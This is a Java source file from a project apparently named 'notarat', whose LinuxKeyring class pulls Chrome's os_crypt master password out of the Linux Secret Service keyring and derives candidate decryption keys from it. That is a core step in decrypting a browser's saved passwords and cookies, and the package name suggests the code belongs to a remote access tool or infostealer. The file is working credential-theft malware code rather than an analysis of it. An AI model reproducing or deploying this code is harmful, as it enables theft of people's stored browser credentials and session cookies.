package dev.xotic.notarat.crypto;

import dev.xotic.notarat.dbus.SecretService;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

public final class LinuxKeyring {

    private static volatile List<byte[]> cachedNonEmpty;

    public static List<byte[]> fetchAll(String browser) {
        List<byte[]> cached = cachedNonEmpty;
        if (cached != null) return cached;

        List<byte[]> out = new ArrayList<>();
        String override = System.getProperty("notarat.keyring.password");
        if (override != null && !override.isEmpty()) {
            addCandidates(out, override);
            cachedNonEmpty = out;
            return out;
        }

        Throwable failure = null;
        try (SecretService svc = new SecretService()) {
            for (String schema : new String[]{
                    "chrome_libsecret_os_crypt_password_v2",
                    "chrome_libsecret_os_crypt_password"}) {
                List<String> items = svc.search(schema);
                for (String item : items) {
                    String secret = svc.getSecret(item);
                    if (secret == null || secret.isEmpty()) continue;
                    addCandidates(out, secret);
                }
            }
        } catch (Throwable t) {
            failure = t;
        }

        if (failure != null) {
            failure.printStackTrace();
        }

        if (!out.isEmpty()) cachedNonEmpty = out;
        return out;
    }

    private static void addCandidates(List<byte[]> out, String secret) {
        String trimmed = secret.trim();
        try {
            byte[] decoded = Base64.getDecoder().decode(trimmed);
            if (decoded.length > 0) {
                addUnique(out, decoded);
                if (decoded.length > 16) addUnique(out, Arrays.copyOf(decoded, 16));
            }
        } catch (IllegalArgumentException ignored) {}
        addUnique(out, trimmed.getBytes(StandardCharsets.UTF_8));
    }

    private static void addUnique(List<byte[]> out, byte[] k) {
        if (k == null || k.length == 0) return;
        for (byte[] e : out) if (Arrays.equals(e, k)) return;
        out.add(k);
    }

    private LinuxKeyring() {}
}